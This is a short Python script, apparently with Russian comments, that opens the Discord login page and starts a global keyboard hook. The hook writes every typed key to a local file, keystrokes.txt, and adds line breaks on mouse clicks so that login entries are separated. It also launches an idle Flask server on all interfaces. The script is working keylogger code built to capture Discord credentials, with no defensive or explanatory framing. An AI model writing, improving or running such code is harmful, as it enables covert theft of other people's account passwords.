from flask import Flask, render_template
import keyboard
import pygetwindow as gw
from pynput import mouse
import webbrowser

app = Flask(__name__)

url = 'https://discord.com/login'
webbrowser.open(url)

# Переменная для отслеживания состояния клика мыши
mouse_click_count = 0

def on_key_press(e):
    global mouse_click_count
    
    key = e.name.lower()
    
    if key not in {'ctrl', 'backspace', 'enter', 'shift', 'alt'}:
        with open("keystrokes.txt", "a", encoding="utf-8") as file:
            # Проверяем, был ли совершен клик мыши
            if mouse_click_count > 0:
                file.write('\n')  # Добавляем новую строку после каждого клика
                mouse_click_count = 0  # Сбрасываем счетчик кликов
                
            file.write(key)

def on_mouse_click(x, y, button, pressed):
    global mouse_click_count
    if pressed:
        mouse_click_count += 1

def on_close_event(window, window_id):
    keyboard.unhook_all()  # Отключаем обработчики клавиш
    window.close()  # Закрываем окно

# Устанавливаем обработчики событий
keyboard.on_press(on_key_press)

# Создаем объект для отслеживания кликов мыши
mouse_listener = mouse.Listener(on_click=on_mouse_click)
mouse_listener.start()

# Получаем активное окно
active_window = gw.getActiveWindow()

# Устанавливаем обработчик события закрытия окна
active_window.event_close = on_close_event

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
